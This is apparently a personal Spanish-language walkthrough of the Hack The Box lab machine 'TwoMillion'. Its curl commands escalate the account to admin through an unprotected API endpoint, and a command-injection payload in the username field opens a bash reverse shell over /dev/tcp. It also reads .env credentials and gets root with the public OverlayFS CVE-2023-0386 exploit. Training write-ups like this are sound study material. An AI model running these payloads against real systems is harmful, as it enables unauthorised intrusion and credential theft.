@@ -1,0 +1,202 @@
+TwoMillion Easy
+
+sudo nmap -p22,80 -sCV $IP -oN targeted
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-14 17:37 CEST
+Nmap scan report for 2million.htb (10.129.166.17)
+Host is up (0.066s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp open  http    nginx
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-trane-info: Problem with XML parsing of /evox/about
+|_http-title: Hack The Box :: Penetration Testing Labs
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.06 seconds
+
+bueno en principio miro por encima la web y tiene un login
+
+no funcionan las credenciales clasicas
+
+también tiene un join
+
+y en este caso es parecido al sistema que tenía htb antes para tener cuenta que tenían un minidesafio
+
+http://2million.htb/invite
+
+bueno aquí inspeccionamos el código y en this en la consola ya vemos el metodo de makeinvitecode
+
+Object { 0: 200, success: 1, data: {…}, hint: "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..." }
+
+"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr"
+Y la encription nos pone rot13
+
+con cyberchef
+
+In order to generate the invite code, make a POST request to /api/v1/invite/generate
+curl -X POST http://2million.htb/api/v1/invite/generate
+{"0":200,"success":1,"data":{"code":"MTBZMFotSFkzTkItVUtFS1MtWU5VNzI=","format":"encoded"}}%    
+
+la decodeamos de base64
+
+echo "MTBZMFotSFkzTkItVUtFS1MtWU5VNzI=" | base64 -d; echo
+10Y0Z-HY3NB-UKEKS-YNU72
+
+Nos registramos y estamos dentro en la web
+
+
+bueno muchas partes del sitio no tienen enlace, así que casi podemos ir solo a conection pack
+
+curl -s -X GET "http://2million.htb/api/v1" -v
+
+Y tenemos unauthorized
+
+curl -s -X GET "http://2million.htb/api/v1" -H "Cookie: PHPSESSID=cukarqvii6vbp0egsoon7edtkv"
+
+y toca explotar un poco la api de abajo
+
+queremos hacer el user/vpn/generate pero no podemos
+
+vemos que es para admins en este caso y no tenemos autorización con nuestra cuenta
+
+"admin": {
+      "GET": {
+        "/api/v1/admin/auth": "Check if user is admin"
+      },
+      "POST": {
+        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
+      },
+      "PUT": {
+        "/api/v1/admin/settings/update": "Update user settings"
+      }
+
+Probamos un poco todas y vemos que tenemos que ir a generate
+
+curl -s -X PUT "http://2million.htb/api/v1/admin/settings/update" -H "Cookie: PHPSESSID=cukarqvii6vbp0egsoon7edtkv"
+{"status":"danger","message":"Invalid content type."}%   
+
+pues nos va dando mensajes de error y acabamos haciendonos admin
+curl -s -X PUT "http://2million.htb/api/v1/admin/settings/update" -H "Cookie: PHPSESSID=cukarqvii6vbp0egsoon7edtkv" -H "Content-type: application/json" -d '{"email":"m@m.m","is_admin":1}'
+{"id":13,"username":"m","is_admin":1}%   
+
+curl -s -X GET "http://2million.htb/api/v1/admin/auth" -H "Cookie: PHPSESSID=cukarqvii6vbp0egsoon7edtkv"
+{"message":true}%   
+
+Y sacamos el certificado
+curl -s -X POST "http://2million.htb/api/v1/admin/vpn/generate" -H "Cookie: PHPSESSID=cukarqvii6vbp0egsoon7edtkv" -H "Content-type: application/json" -d '{"username": "m"}'
+client
+dev tun
+proto udp
+
+
+el tema es que realmente no nos vamos a comentar hay más cosillas en la máquina
+
+tras comprobar que name se le podía poner un comando a continuación abrimos una revshell
+
+curl -s -X POST "http://2million.htb/api/v1/admin/vpn/generate" -H "Cookie: PHPSESSID=cukarqvii6vbp0egsoon7edtkv" -H "Content-type: application/json" -d '{"username": "m; bash -c \"/bin/bash -i >& /dev/tcp/10.10.x.x/4455 0>&1\""}'
+
+cat .env
+cat .env
+DB_HOST=127.0.0.1
+DB_DATABASE=htb_prod
+DB_USERNAME=admin
+DB_PASSWORD=SuperDuperPass123
+
+ya tenemos acceso como admin y podemos coger la flag de user
+
+-----
+
+find / -perm -4000 2>/dev/null
+/snap/snapd/19122/usr/lib/snapd/snap-confine
+/snap/core20/1891/usr/bin/chfn
+/snap/core20/1891/usr/bin/chsh
+/snap/core20/1891/usr/bin/gpasswd
+/snap/core20/1891/usr/bin/mount
+/snap/core20/1891/usr/bin/newgrp
+/snap/core20/1891/usr/bin/passwd
+/snap/core20/1891/usr/bin/su
+/snap/core20/1891/usr/bin/sudo
+/snap/core20/1891/usr/bin/umount
+/snap/core20/1891/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/1891/usr/lib/openssh/ssh-keysign
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/su
+/usr/bin/umount
+/usr/bin/chsh
+/usr/bin/fusermount3
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/chfn
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+/usr/libexec/polkit-agent-helper
+
+Buscamos los archivos de admin excluyendo proc y sys
+
+find / -user admin 2>/dev/null | grep -vE "proc|sys"
+/run/user/1000
+/run/user/1000/snapd-session-agent.socket
+/run/user/1000/pk-debconf-socket
+/run/user/1000/gnupg
+/run/user/1000/gnupg/S.gpg-agent
+/run/user/1000/gnupg/S.gpg-agent.ssh
+/run/user/1000/gnupg/S.gpg-agent.extra
+/run/user/1000/gnupg/S.gpg-agent.browser
+/run/user/1000/gnupg/S.dirmngr
+/run/user/1000/bus
+/home/admin
+/home/admin/.cache
+/home/admin/.cache/motd.legal-displayed
+/home/admin/.ssh
+/home/admin/.profile
+/home/admin/.bash_logout
+/home/admin/.bashrc
+/var/mail/admin
+/dev/pts/0
+
+Podemos ver un poco todos los archivos
+cat /var/mail/admin
+From: ch4p <ch4p@2million.htb>
+To: admin <admin@2million.htb>
+Cc: g0blin <g0blin@2million.htb>
+Subject: Urgent: Patch System OS
+Date: Tue, 1 June 2023 10:45:22 -0700
+Message-ID: <9876543210@2million.htb>
+X-Mailer: ThunderMail Pro 5.2
+
+Hey admin,
+
+I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.
+
+HTB Godfather
+
+https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/
+
+uname -r y buscamos version menor a la 6.2
+
+https://github.com/puckiestyle/CVE-2023-0386
+
+zip -r ex.zip CVE/
+
+abro un servidor web lo bajo con curl -O
+
+hago make all
+
+y nada en una terminal hago lo que dice y en la otr ./exp
+
+y ya tengo root
+
+Y con esto está todos
+
+Alternativamente hay otro exploit para glib de linux que tambien te deja
